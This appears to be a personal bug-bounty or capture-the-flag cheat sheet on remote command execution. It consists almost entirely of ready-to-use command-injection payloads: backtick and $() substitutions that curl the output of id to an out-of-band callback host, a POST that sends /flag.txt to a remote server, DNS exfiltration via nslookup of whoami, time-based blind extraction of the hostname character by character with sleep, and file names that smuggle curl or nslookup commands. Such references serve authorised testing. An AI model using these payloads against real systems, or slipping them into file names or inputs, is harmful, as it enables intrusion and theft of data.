# Remote Code/Command Execution (RCE)

RCE vulnerabilities allow an attacker to execute arbitrary commands or code on a target system. These can arise from command injection, deserialization flaws, file upload vulnerabilities, SSTI, and more.

## Non-Destructive Commands

- pwd
- uname
- id
- hostname

These are good for BB programs

## Inline RCE

Use \` backticks

Example:

```
`echo 1.1.1.1`
```

Use subcommand

```
$(echo 1.1.1.1)
```

Combination

```
$(curl https://qdatsdqwvpduvmxhhulycpld80fmpl0mb.oast.fun/$(id))
```

## Blind RCE

Exfil data

```
$(curl -X POST -d $(cat /flag.txt) https://$SERVER)
```

## Blind over DNS

Using nslookup with command as subdomain

```
nslookup `whoami`.$SERVER.oast
```

## Blind (No Network)

Use an `if` statement with `sleep`.

Check with sleep first

```bash
/something?id=test; sleep 10
```

Get a working IF statement

```
if [ "a" = "a" ]; then sleep 10; fi
```

> [!tip]
> On `sh` use one `=`, on `bash` use two `==`.

Get the value one character at a time

```
if [ $(hostname | cut -c 1-1 ) = "a" ]; then sleep 10; fi
```

## Via file upload

Understand what the app is doing with the file. If it's moving or renaming, we can try to use something like the following in the file name

```
`curl OAST.FUN`.pdf
```

```
`nslookup $(whoami).OAST.FUN`.pdf
```

---

## References

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - RCE](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
